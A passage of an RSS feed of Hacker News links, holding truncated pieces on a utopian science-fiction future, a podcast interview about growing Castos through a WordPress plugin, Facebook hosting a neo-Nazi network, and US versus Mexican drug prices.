<p>The possibility I wanted to explore is that things didn’t start going astray after 9/11, or because of Nixon, or with the Industrial Revolution, or even with the invention of race that enabled the Native American genocide and the Trans-Atlantic slave trade. I wanted to explore the possibility that humanity lost its way in the Neolithic Era. We regard the Neolithic as the beginning of history, and if we mean written history, maybe. But humans lived for two hundred thousand years before that—before the fall of Troy, before permanent settlements, before the invention of surplus and property and money and agriculture. All of that is only about twelve thousand years old, or, 6% of our history. The fact that we don’t have newspapers from the other 94% of our history doesn’t mean it didn’t happen. It also doesn’t make it any less important when thinking about the range of human possibility, and the range of possible human futures.</p>
<p>Much of science fiction deals with imagining dystopia. I’ll talk about why that is later, but I strongly believe that, at this moment in time, we need to remember that one of the highest callings of science fiction is imagining utopia. I don’t mean starry-eyed visions of a fairyland that drops out of the sky. I also don’t mean a static society built on some fundamental irony like panopticon or the suppression of free will. I mean honest, earnest engagement with the question of what a better world looks like.</p>
<p>In the <em>Earthseed </em>trilogy, Octavia Butler’s characters go through hell in their struggle to establish a utopian community. In the <em>Mars </em>trilogy, Kim Stanley Robinson’s characters go through several revolutions and constitutions in building a better world than the one they came from (Earth). Ursula K. Le Guin—who died while I was composing this talk—is the leader of us all in this regard. Her work engages the idea of realistic utopia over and over again—through Hain, Anarres, Gethen, Earthsea, and of course, Omelas.</p>
<p>My novel <em>The Actual Star </em>is an attempt to work in that same tradition. The distant past—the collapse of Maya civilization—takes place amid the failure of monarchy. The present—our age, the “Age of Emergency”—takes place amid the failure of capitalism. So, what does the year 3012 look like? I’ll first describe it, and then describe how I got there, extrapolating from this moment in time.</p>
<p>~</p>
<p>In 3012, the world operates by the twin philosophy of accumulation and dispersion. Put as simply as possible, The Law of Accumulation states that accumulation of any human property ultimately leads to human suffering. For example, accumulation of capital leads to inequality. Accumulation of family ties leads to feuds. Accumulation of feuds leads to war. Accumulation of population leads to disease. Accumulation of territory and power leads to war. Not necessarily at first, or even for centuries—but eventually, always.</p>
<p>The antidote is the Law of Dispersion. Put as simply as possible, it states that lasting peace can only result from the constant temporal and spatial dispersion of all human properties. In other words, we build a society that flows with, not against, the entropic nature of the universe.</p>
<p>In 3012, there are no borders. There are no nations. There are no families, aside from the human family. We call every other person “carnala,” a Mexican Spanish term meaning “a blood relation.” The average life expectancy is 130 years. The world population is steady at one billion. We roam the earth as permanent nomads, and, by common agreement, only own as much as we can carry—this is why the system is called Laviaja, a feminized form of “El Viaje,” Spanish for “the journey.” Those of us who cannot move or walk are accommodated so radically by mutual aid, artificial intelligence, and augmented reality that the very concept of disability no longer exists. In fact, many of us <em>choose </em>to have what we think of as disabilities, and call them “gifts,” because they are ways of creating community.</p>
<p>We eat primarily by foraging, a practice now aided by advanced artificial intelligence and augmented reality. No one eats animals, since we began learning their languages. Where there isn’t much to be foraged, our photosynthetic skin takes over. When we want home-cooked food, we go to a wayhouse. Wayhouses are places where we can rest for up to a period of nine days, in exchange for a few hours of work a day. We gather for two daily meals plus, in many areas of the world, teatime. Agribots—farming robots—do the majority of farming and gardening, strictly on a subsistence basis, near wayhouses. In other words, no one goes hungry. Food security is simply not an issue. This is because, at a certain point, around the 23<sup>rd</sup> century, all technology was built to serve humankind, not profit.</p>
<p>None of us stay in the same place for more than nine days. None of us even stay with the same people for more than nine days. But whomever we lose, we regain. With whomever we meet on the road, we fall into any number of familiar roles—sister and sister, lover and lover, mother and child, aunt and niece, elder and youth—and one of the greatest joys of life is that dance of discovery, of what each new person is to the other. If we give birth, we gladly give up our baby within nine days; assured that our child will come back to us again and again in the form of other children, throughout our lives.</p>
<p>There is no space travel, since space programs were dependent on capitalism. There are aliens, but they’re so far away that we have to wait a few hundred years every time we want to say anything, so it doesn’t affect our lives very much. There are no weapons; the very idea is strange. Crime is very rare; when it does happen, in the worst cases, the crime is made public and the perpetrator is marked for others to see and avoid if they wish, but the criminal is still allowed free movement in the world. Their exile is social.</p>
<p>There’s no currency or system of money; there’s a worldwide, perpetual gift exchange. Objects have no value beyond their practical use; a plastic bowl is as good as a porcelain bowl. There’s no manufacturing because there’s no need for material goods. Everything is used on a recycled basis.</p>
<p>There are approximately fifteen hundred genders. Anyone who wants to bear a child can do so. No pregnancy is unplanned. There’s no correlation between genitalia and gender. Some of the genders are in fact the descendants of nationalist and ethnic identities, as there have long ceased to be nations or ethnic groups in any meaningful way, given the Law of Dispersion. Identity is completely voluntary and mutable.</p>
<p>The system of government, such as it is, is a worldwide sortition democracy, which is actually a very old form of democracy. A legislature is randomly selected from a pool of all available citizens, from the age of seven years old. This legislature is in session twenty-four hours a day, its members refreshed every hour, on the hour, mostly just to re-ratify a basic Bill of Rights, but also to take up whatever special questions apply on the global scale. As a citizen, you’re called to serve for about one hour every year or two. For local matters, moving clusters of people are governed by algorithms called “umbrellas” that take into account each person’s needs and preferences. An umbrella may govern a single wayhouse, or an area of a hundred square kilometers, depending on the number of people present, which is always changing.</p>
<p>A person can opt out of this system. They aren’t punished. They aren’t banned. They’re never refused food or shelter, care or companionship, wherever they go. The highest law is the rule of the road, which is radical …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://monicacatherine.com/2018/02/08/instructions-for-the-age-of-emergency/">https://monicacatherine.com/2018/02/08/instructions-for-the-age-of-emergency/</a></em></p>]]>
            </description>
            <link>https://monicacatherine.com/2018/02/08/instructions-for-the-age-of-emergency/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25184662</guid>
            <pubDate>Mon, 23 Nov 2020 08:25:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Turning a WordPress Plugin into a Customer Acquisition Channel with Craig Hewitt]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25184326">thread link</a>) | @Mike-Dane
<br/>
November 22, 2020 | https://keevi.io/launch-legends/castos-customer-acquisition-channel | <a href="https://web.archive.org/web/*/https://keevi.io/launch-legends/castos-customer-acquisition-channel">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-id="40fe66f" data-element_type="section">
						<div>
							<div>
					<div data-id="64431ed" data-element_type="column">
			<div>
							<div>
						<div data-id="a333c30" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Craig Hewitt, Founder at </span><a href="https://castos.com/"><span>Castos</span></a><span> joins Hammad Akbar in this episode of Launch Legends Podcast.</span></p><h2>Key Stats<span>&nbsp;</span></h2><ul><li><span>Castos generate $500,000 in revenue</span></li><li><span>Has 2000 customers</span></li></ul><h2>Key Takeaways</h2><ul><li><span>Acquire some existing product to use it as a customer acquisition channel.</span></li><li><span>Leverage the existing audience.</span></li><li><span>Build a product in the space of which you already know about.</span></li><li><span>Non-technical founder has to figure out everything himself.</span></li><li><span>If you are not embarrassed by your product’s first version, you launched too late.</span></li><li><span>Put the value of your product in an authentic and genuine way.</span></li><li><span>Listen to everything, everybody has to say and then distill it down.</span></li><li><span>Support team gives a lot of actionable feedback to make informed product decisions.</span></li><li><span>Any company that is less than 5 years old can’t plan a year out.</span></li><li><span>Keeping everybody happy and managing expectations are the key.</span></li><li><span>Be really honest with your customers.</span></li><li><span>Use support hours to work around problems.</span></li><li><span>Have a longer beta period.</span></li></ul><h2>Transcription</h2><p><b>Hammad:</b></p><p><span>Hey Craig, thank you for being on the show. So, founder of </span><a href="https://castos.com/"><span>Castos</span></a><span>, you guys are doing about $500,000 in revenue. I know you’ve got some more revenue on top of that, but you know, you sell professional services.&nbsp;</span></p><p><span>You only launched in 2017 and you’ve got over 2000 customers. So very great. so let’s start with actually who you are and why did you build a product and how did you grow it?</span></p><p><b>Craig:</b></p><p><span>Yeah. So my name is Craig Hewitt. I’m the founder of </span><a href="https://castos.com/"><span>Castos</span></a><span>. We’re a podcast hosting and analytics platform that also does a podcast editing and production. So that’s kind of our professional services arm.&nbsp;</span></p><p><span>I got into </span><a href="https://castos.com/"><span>Castos</span></a><span>, kind of via the professional services. I owned and still do a product.service business called </span><a href="https://www.podcastmotor.com/plugin/"><span>PodcastMotor</span></a><span>.</span></p><p><span>That was kind of my first foray into online business and being a digital nomad, built that up into, you know, a really solid business that sustained kind of my family and I then had the opportunity to acquire a WordPress podcast plugin, which is really kind of how Castos started. So we also own and manage the </span><a href="https://wordpress.org/plugins/seriously-simple-podcasting/"><span>seriously simple podcasting</span></a><span> WordPress plugin that are our podcasts hosting platform interfaces with.</span></p><p><span>So a lot of people with a podcast have a website, a lot of them run on WordPress. We make it really easy for you to manage all of your podcast content, right from the WordPress site and then upload your files directly to the Castos platform.&nbsp;</span></p><p><b>Hammad:</b></p><p><span>All right. So quite a plugin, I’m not going to ask you how much you paid for it, but do they have a lot of users?</span></p><p><b>Craig:</b></p><p><span>Yeah. I mean, WordPress gives you kind of fuzzy statistics, but it had more than 10,000 active installs and like everything and wordpress.org, it was entirely free and still is entirely free.&nbsp;</span></p><p><span>You can use a seriously simple podcasting plugin entirely for free. And then we have the </span><a href="https://castos.com/"><span>Castos </span></a><span>platform as an optional add on. So it’s kind of our version of freemium.&nbsp;</span></p><p><b>Hammad:</b></p><p><span>Oh, great. That’s a great strategy. So you actually got something which had lots of very targeted customers, users and you only had to build customers behind it. So talk to me about </span><a href="https://castos.com/"><span>Castos</span></a><span>. How did you start building it?&nbsp;</span></p><p><b>Craig:</b></p><p><span>Yeah, I’m laughing because you say you only had to build it.</span></p><p><span>I mean we did get lucky. I mean, it was lucky and strategic to say, yeah, Hey, we can acquire this plugin as a, you know, marketing and customer acquisition channels, was lucky and strategic but, I think building a really great product, especially in our market, which I think is both kind of B2C.</span></p><p><span>So like beat a pro-sumer maybe you would say but also is really, kind of sensitive in that, like it’s the way that people express themselves. So, you know, it’s like maybe a website hosting provider or something like that. You want the experience people to have there to be really easy and simple and beautiful.</span></p><p><span>And so I think building a tool like that is hard and our spaces, probably just as competitive as anyone else’s, but to build a really great product is super hard. Even if you have a marketing channel kind of already figured out, yeah, building a great product is super tough.</span></p><p><b>Hammad:</b></p><p><span>So I actually said it because a lot of people I’ve spoken to, they really struggled with finding their target audience. So they go on LinkedIn on all sorts of different customer acquisition channels. Really sending out cold emails, trying to get them on the phone, talking to them.&nbsp;</span></p><p><span>So I said it, from that perspective that you had the audience ready and you were able to talk to them probably very quickly, you didn’t have to go and try different things to get them on the call.</span></p><p><span>So of course, building a great product takes a long time. Even with the best customer feedback, you’ll probably end up doing something which is not needed in the marketplace.&nbsp;</span></p><p><span>So I agree with you, it’s not easy. I’ll probably make it sound very easy, but it’s actually very difficult. Being a software entrepreneur myself. I know it’s very difficult.&nbsp;</span></p><p><b>Craig:</b></p><p><span>Yeah for sure. Yeah. I mean, we did have a lot of access to the folks that ended up becoming our first customers and I also came from the space, you know, so running a product as service in the podcasting space is how we got introduced to the guy that we bought the plugin from.</span></p><p><span>We had a bunch of customers that had a presence we’re able to leverage a lot of that audience. You know, we talked about the audience before we started recording.&nbsp;</span></p><p><span>So I think a lot of that made the marketing and the distribution easier for us. At the beginning, we just focused on the product, which made it a lot easier.</span></p><p><b>Hammad:</b></p><p><span>Let’s talk about product development. What does that look like from day one, till the point where you probably launched your first beta version?&nbsp;</span></p><p><b>Craig:</b></p><p><span>Bad. I mean, I’m not a developer, right? I’m a non-technical founder and I’m a single founder. So, it was me figuring out how to work with a developer and pay them and build a nice product that people care about and have it be easy to use without any experience doing any of that.</span></p><p><span>And, I mean, I laugh looking back at our initial product. It was really terrible compared to what we have now, which I think is really great but that’s how it should be.</span></p><p><span>You know, they say like, if you’re not embarrassed of your first version, you launched too late. we didn’t launch too late in that respect. I mean, the way we did it is I think a nice model for folks if they’re starting out like as a consultant or they own an agency or something like that is use that revenue to pay rent and support your family and stuff like that, but also to fund the development of your software product.</span></p><p><span>And that’s what we did. So we were able to hire a developer part-time. And it took about five months to build a product and to update the WordPress plugin to kind of support that and then we launched, kind of that to existing audiences of WordPress users and very fortunately kind of had customers on the first day which I think is something that not a lot of people do.&nbsp;</span></p><p><span>We had a kind of major hiccup on the WordPress side with our launch day that kind of broke some people’s sites and stuff. But aside from that, the SAAS side of things, the product launch actually went pretty smoothly.</span></p><p><b>Hammad:</b></p><p><span>Yeah. So when you say launch, did you follow any email sequence? Did you create some hype or you just sent them an email and said, look, okay, we’ve launched this product.&nbsp;</span></p><p><b>Craig:</b></p><p><span>Yeah. I think we might have sent an email a couple of days before launch and then sent an email on launch day but we put some things into the WordPress kind of user experience to prompt people and say, Hey, you know, here’s this hosting platform you can opt in here and have your files hosted and manage all of your stuff from WordPress.</span></p><p><span>So a lot of the opt-in of that conversion and like awareness for the customers was kind of natively in WordPress. You have to be careful about that. I think to respect the real estate there and respect the way people use that tool since it is, you know, open-source and free and people don’t want to be bugged there.</span></p><p><span>And I think we do and did a good job of respecting that. But at the same time, putting the value proposition in front of customers in an authentic and genuine way.</span></p><p><b>Hammad:</b></p><p><span>How did the product go from there? So you got like a bunch of customers in the beginning. Straight away. And you got a bunch of users.</span></p><p><span>How did you work with them after that? And how did you get into a point where it’s a great product now?</span></p><p><b>Craig:</b></p><p><span>Yeah. I think that the easy answer is we just listened to everything everybody said and try to distill it down because I think that’s really hard if you’re hearing a bunch of different things and I’ve had failed attempts at other products where everybody is saying something different and you, at the end of the day, you just say like, what is going on here?</span></p><p><span>Like, how are we so far off that. This guy says they need an API. This guy says they need OAuth. This guy says they need a better UI and it’s all over the place.&nbsp;</span></p><p><span>You can’t say, this is the thing we need to do. I think maybe we have the volume of feedback, from a bunch of free users of the plugin and very fortunately a decent number of paying users of the hosting platform to say, okay, a bunch of people are asking for this thing, let’s go tackle this.</span></p><p><span>And it was like whack-a-mole right. So like you go to the arcade and you get this game where like the little mole pops up and you whack him on the head and then he comes over here and you whack him on the head over there.&nbsp;</span></p><p><span>And that’s, I mean, that’s what we did for an embarrassingly long amount of time, like a year and a half of just like, well, what’s the fire this week.</span></p><p><span>Let’s go put it out. Let’s go fix this thing or create this feature or whatever. But I think we’re pretty agile in that way. Even today, our product development cycles are not super long, but we stay really attuned to what our customers are asking for.&nbsp;</span></p><p><span>Our support team gives us a lot of really actionable feedback that informs the product decisions and product cycle.</span></p><p><span>And, we’re not an old enough company. You know, we’re not base camp to say like, Hey, we’re going to …</span></p></div></div></div></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://keevi.io/launch-legends/castos-customer-acquisition-channel">https://keevi.io/launch-legends/castos-customer-acquisition-channel</a></em></p>]]>
            </description>
            <link>https://keevi.io/launch-legends/castos-customer-acquisition-channel</link>
            <guid isPermaLink="false">hacker-news-small-sites-25184326</guid>
            <pubDate>Mon, 23 Nov 2020 07:24:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook Condemned for Providing Platform to Neo-Nazi Network]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25184311">thread link</a>) | @wikus
<br/>
November 22, 2020 | https://hfet.org/facebook-condemned-for-providing-platform-to-neo-nazi-network/ | <a href="https://web.archive.org/web/*/https://hfet.org/facebook-condemned-for-providing-platform-to-neo-nazi-network/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
	<main id="main" role="main">

		
<article id="post-1222">

	<!-- .entry-header -->

	
		<figure>
			<img width="1080" height="540" src="https://hfet.org/wp-content/uploads/2020/11/pexels-brett-jordan-5426402-e1606077190468-1080x540.jpg" alt="" loading="lazy" srcset="https://hfet.org/wp-content/uploads/2020/11/pexels-brett-jordan-5426402-e1606077190468-1080x540.jpg 1080w, https://hfet.org/wp-content/uploads/2020/11/pexels-brett-jordan-5426402-e1606077190468-20x11.jpg 20w" sizes="(max-width: 1080px) 100vw, 1080px">		</figure>

		
	
<div>

	<h3>Facebook is facing a new wave of criticism for providing a platform for a white supremacist network with over 80,000 online followers.</h3>
<ul>
<li>Facebook only removed these pages after being contacted by large media organisation the <em>Observer</em>. The Center for Countering Digital Hate claim they were made aware of this two years ago.</li>
</ul>
<p>The Guardian reports this Neo-Nazi network also has ties to the UK far right, <a href="https://www.theguardian.com/technology/2020/nov/22/facebook-condemned-for-hosting-neo-nazi-network-with-uk-links" target="_blank" rel="noopener noreferrer">including a student facing terrorism charges</a>. Imran Ahmed, CEO of the Center for Countering Digital Hate, said:</p>
<blockquote>
<p>&nbsp;“Facebook’s leadership endangered public safety by letting Neo-Nazis finance their activities through Facebook and Instagram. Facebook was first told about this problem two years ago and failed to act.”</p>
</blockquote>
<p><img loading="lazy" src="https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-1024x683.jpg" alt="" width="800" height="534" srcset="https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-1024x683.jpg 1024w, https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-300x200.jpg 300w, https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-768x512.jpg 768w, https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-1536x1024.jpg 1536w, https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-2048x1365.jpg 2048w, https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-20x13.jpg 20w, https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-36x24.jpg 36w, https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-48x32.jpg 48w, https://hfet.org/wp-content/uploads/2020/11/pexels-thought-catalog-2228555-272x182.jpg 272w" sizes="(max-width: 800px) 100vw, 800px"></p>
<p>After the <em>Observer</em> contacted Facebook, they began taking down the material with a Facebook spokesperson stating:</p>
<blockquote><p>“We have removed the content which violates our policies prohibiting dangerous organisations. We regularly work to improve our technology to find and remove this content faster, and, while there is more work to do, we are making progress. We’ve banned over 250 white supremacist organisations from Facebook and Instagram.”</p></blockquote>
<h4>Read more of the <a href="https://www.theguardian.com/technology/2020/nov/22/facebook-condemned-for-hosting-neo-nazi-network-with-uk-links" target="_blank" rel="noopener noreferrer">full report on The Guardian</a>.</h4>
<hr>
<p><strong>Author’s Note: </strong>I highly recommend reading <a href="https://hfet.org/opinion-grading-facebooks-homework/"><strong>Grading Facebook’s Homework</strong></a>, which is an opinion piece on Facebook’s response to criticism.</p>
<p><a href="https://hfet.org/feed/"><img src="https://hfet.org/wp-content/uploads/2020/11/rss_button_hfet-1.png" alt="" width="219" height="30"></a><a href="https://hfet.org/support/"><img src="https://hfet.org/wp-content/uploads/2020/11/support_button_hfet.png" alt="" width="165" height="30"></a></p>
    <div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img width="100" height="100" src="https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-150x150.jpg" alt="" loading="lazy" srcset="https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-150x150.jpg 150w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-300x300.jpg 300w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-20x20.jpg 20w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-36x36.jpg 36w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-48x48.jpg 48w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-24x24.jpg 24w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-96x96.jpg 96w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel.jpg 640w" sizes="(max-width: 100px) 100vw, 100px"></p><div><p>I’m an AI &amp; Robotics Student interested in FOSS, Tech Sustainability and Data Rights. I’m also the founder of Humans For Ethical Technology.</p></div></div>	
</div><!-- .entry-content -->


</article>

	</main><!-- #main -->

	


	</div></div>]]>
            </description>
            <link>https://hfet.org/facebook-condemned-for-providing-platform-to-neo-nazi-network/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25184311</guid>
            <pubDate>Mon, 23 Nov 2020 07:22:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Prices of America's Most Expensive Drugs in Mexico (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25184218">thread link</a>) | @gscott
<br/>
November 22, 2020 | https://www.ventanasmexico.com/blog/the-price-of-americas-most-expensive-drugs-in-mexico | <a href="https://web.archive.org/web/*/https://www.ventanasmexico.com/blog/the-price-of-americas-most-expensive-drugs-in-mexico">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-yui_3_17_2_1_1558555673829_15502"><div><h2>The Ventanas Mexico website runs on a Squarespace platform. Squarespace recently added a feature that enables me to see what queries lead people to my site by keywords.&nbsp; Given I write about dozens of topics related to Mexico, imagine my surprise to see the keywords leading people to my site were Zytiga, Embril, and Humira. The names of expensive drugs.</h2><p>I felt terrible that I had not delivered on those queries, as I had only posted the U.S. prices of drugs in the context of demonstrating the excesses of the American healthcare system.&nbsp;</p><p>Now that I know people are seeking this information out and running into my site, I’ve taken some time to research what the most expensive drugs in the U.S. cost in Mexico, starting with those most commonly used by people over 50 years old.&nbsp; &nbsp;Even if you're not yet in the market for these drugs, I'm sure you'll find the list enlightening.</p><p>This information is not available to you in the U.S. without a Virtual Private Network (VPN). The reasons are probably no more nefarious than the Google algorithms behind them.&nbsp;</p><p>Google searches (and I would assume other search engines) are location-based. While that’s great when you are looking for a dry cleaner, it’s not so good when you are doing research for information like drug prices in another country.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1558556648706_18811"><div><p>The best way to access this information is by using a VPN (Virtual Private Network) to hide your location from search engines.&nbsp; With a VPN you choose what server you want to use. When I had a VPN in Mexico last year, I chose a Denver server to prevent my searches from coming up local and in Spanish.</p><p>In this case, to access the information about drug prices in Mexico or another country, you would need to choose a server in the country of choice and do the query in that language. Being in Mexico already, I didn’t need a V.P.N. All I needed to do was ask, “Cuanto cuesta Zytiga en Mexico.”&nbsp; If I were in the States seeking the information, I'd choose a server in Mexico, and do my searches in Spanish just to be sure.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1533001011992_99855"><div><p>The prices you see in the list below are what the drugs cost from major drug wholesalers in Mexico. The packaging and trademark information is identical (other than being in Spanish).</p><p>If the price isn’t listed beside a drug name, it doesn’t necessarily mean it’s not available. It may be distributed only by hospitals or doctors.</p><p>I was surprised how much the U.S. prices have fluctuated since I originally looked them up a year or so ago. <a href="https://www.nbcnews.com/health/health-care/are-you-kidding-me-check-out-price-tags-combination-drugs-n1049276">Here</a> is a 2019 article on the cost of combination drugs.</p><p>If I've written only "Mexico" beside the drug, it means the price wasn't available in a simple search.</p><p>If there is a particular drug you want me to check that is not on this list, email me at kerryinmexico@gmail.com.&nbsp; I'll do my best.</p><p><strong>Drug &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Count &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Cost  (based on exchange rate of 18 pesos to the dollar)</strong></p><p>Alvendazole (anti-parasitic)                                                                                   $300      Mexico: $3                                       </p><p>Actos -&nbsp;&nbsp;a diabetes drug - &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$254&nbsp; &nbsp; &nbsp;Mexico:&nbsp; &nbsp;$60&nbsp; (Zactos)</p><p>Advair Diskus - &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;an inhaler &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$49&nbsp; &nbsp; &nbsp;Mexico:&nbsp;</p><p>Afinitor&nbsp; (cancer treatment)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $14,524&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico:&nbsp; $3,689</p><p>Albuterol Sulfate&nbsp; (asthma)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;25 vials &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$15</p><p>Alimta&nbsp; (cancer treatment )&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;vials&nbsp; &nbsp; &nbsp;500 mg&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$3,027&nbsp; &nbsp; &nbsp; &nbsp; Mexico: $1,018</p><p>Amlodipine Besy (blood pressure lowering) &nbsp; &nbsp; 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$6</p><p>Amoxicillin (Antibiotic) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$9</p><p>Aranesp&nbsp; (builds red blood cells)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;four syringes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$1,569&nbsp; &nbsp; &nbsp; Mexico:&nbsp; $216</p><p>Atorvastatin ca (Cholesterol lowering) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$11</p><p>Avastin&nbsp; (cancer treatment)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; per dose&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $55</p><p>Avonex&nbsp; (&nbsp;multiple sclerosis )&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;four syringes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$6,750&nbsp; &nbsp; &nbsp;Mexico:&nbsp; $1,367</p><p>Azithromycin (brand names include Z-Pak and Zithromax)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;6 tablets &nbsp; &nbsp; &nbsp; &nbsp; 